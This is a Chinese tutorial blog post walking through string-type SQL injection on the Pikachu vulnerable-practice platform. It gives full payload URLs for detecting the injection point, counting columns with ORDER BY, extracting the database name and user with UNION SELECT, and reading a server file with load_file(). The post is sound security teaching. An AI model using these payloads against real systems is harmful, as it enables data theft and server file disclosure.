发表于 2019-07-27 更新于 2019-08-23 分类于 WEB安全 ， PHP ， SQL注入

一、实验环境

  • Pikachu漏洞联系平台 （Windows+Phpstudy环境）
  • 火狐浏览器（附带插件HackBar）
  • 漏洞平台地址为：http://192.168.31.193/pika

二、SQL注入原理

数据库注入漏洞，主要是开发人员在构建代码时，没有对输入边界进行安全考虑，导致攻击可以通过合法的输入点提交一些精心构造的语句，从而欺骗后台数据库进行执行，导致数据库信息泄露的一种漏洞。

三、实验步骤

  1. 观察注入点
    尝试在表单中提交数据 kobe 观察URL：http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=kobe&submit=查询， 与网页中的表单，如图1-1所示：

  2. 检测注入点
    尝试在name=kobe参数后面加上 ‘ (URL编码为：%27）
    然后观察页面变化，URL:http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=kobe'submit=查询
    可以看到加上之后页面内容报错，出现这种现象大多数情况下时存在注入点，如图1-2所示:

  3. 查询显示的字段数
    尝试使用order by语句判断该网页表单能够显示的字段数，URL:http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=1%27order+by+3+--+&submit=查询， 出现“Unknown column ‘3’ in ‘order clause’” ，3表示已经超出表单的显示数量，所以该表单的字段的显示数量为2个字段，如图1-3所示：

  4. 获取当前数据库及运行数据库的用户名
    使用联合查询语句union select 获取当前的数据库及运行Mysql服务的用户
    URL:http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=1%27union+select+database(),user()+--+&submit=查询 ，效果如图1-4所示：

  5. 通过SQL注入漏洞读取WEB服务器本地的文件内容
    使用load_file()语句读取本地C盘中的flag.txt文件内容URL：http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=1%27%20union%20select%20null,load_file(%22C:\\flag.txt%22)+--+&submit=查询 ，效果如图1-5所示：
